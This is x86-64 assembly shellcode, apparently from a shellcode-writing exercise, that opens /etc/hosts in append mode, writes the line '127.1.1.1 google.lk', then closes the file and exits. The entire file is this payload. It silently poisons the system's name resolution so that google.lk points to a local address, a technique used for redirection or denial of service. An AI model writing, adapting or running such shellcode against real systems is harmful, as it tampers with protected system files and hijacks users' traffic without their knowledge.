global _start
    section .text

_start:
    ;open
    push 0x2
    pop rax
    xor rdi, rdi
    push rdi
    pop rsi
    push rsi ; 0x00
    mov rcx, 0x2f2f2f2f6374652f ; stsoh/
    mov rbx, 0x7374736f682f2f2f ; /cte/
    push rbx
    push rcx
    add rdi, rsp
    xor rsi, rsi
    add si, 0x401
    syscall

    ;write
    xchg rax, rdi
    push 0x1
    pop rax
    jmp data

write:
    pop rsi
    mov dl, 19 ; length in rdx
    syscall

    ;close
    push 0x3
    pop rax
    syscall

    ;exit
    xor rax, rax
    push rax
    push 60
    pop rax
    pop rdi
    syscall

data:
    call write
    text db '127.1.1.1 google.lk'
